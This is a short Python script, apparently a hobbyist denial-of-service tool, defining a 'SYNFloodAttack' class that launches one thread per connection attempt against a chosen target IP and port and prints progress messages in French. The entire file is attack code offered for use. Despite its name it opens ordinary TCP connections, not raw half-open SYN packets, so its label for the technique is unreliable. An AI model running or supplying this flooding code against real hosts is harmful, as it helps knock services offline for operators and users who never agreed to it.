import socket
import threading
import time

class SYNFloodAttack:
    def __init__(self, target_ip, target_port, num_packets):
        self.target_ip = target_ip
        self.target_port = target_port
        self.num_packets = num_packets
        self.sent_packets = 0
        self.progress = 0
        self.lock = threading.Lock()  # Lock for thread-safe access to shared variables

    def send_syn_packet(self):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.connect_ex((self.target_ip, self.target_port))  # Use connect_ex instead of connect
        sock.close()

        # Update progress
        with self.lock:
            self.sent_packets += 1
            new_progress = min(self.sent_packets * 100 // self.num_packets, 100)  # Ensure progress doesn't exceed 100%
            if new_progress > self.progress:
                self.progress = new_progress
                print(f"{self.sent_packets} paquets envoyés : {self.progress}%")

    def attack(self):
        progress_thread = threading.Thread(target=self.print_progress)
        progress_thread.start()

        threads = []
        for _ in range(self.num_packets):
            t = threading.Thread(target=self.send_syn_packet)
            threads.append(t)
            t.start()

        for t in threads:
            t.join()

        progress_thread.join()  # Wait for the progress thread to finish

    def print_progress(self):
        while self.sent_packets < self.num_packets:
            time.sleep(1)  # Wait for a while before checking progress again
            with self.lock:
                print(f"{self.sent_packets} paquets envoyés : {self.progress}%")
        print("Attaque fini.")
